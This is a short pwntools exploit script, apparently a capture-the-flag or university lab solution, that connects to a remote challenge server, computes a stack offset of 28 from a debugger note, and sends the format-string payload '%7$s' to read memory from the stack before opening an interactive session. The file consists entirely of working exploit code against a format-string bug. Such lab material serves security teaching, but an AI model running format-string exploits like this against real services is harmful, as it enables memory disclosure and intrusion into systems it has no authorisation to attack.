from pwn import *


#P = process("./bin")
P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10051)

# pwndbg> p $ebp - 0xc - $esp
# $1 = 28
offset = 28
location = offset//4 # 7


payload = b"%7$s"

print(len(payload))

P.send(payload)
P.interactive()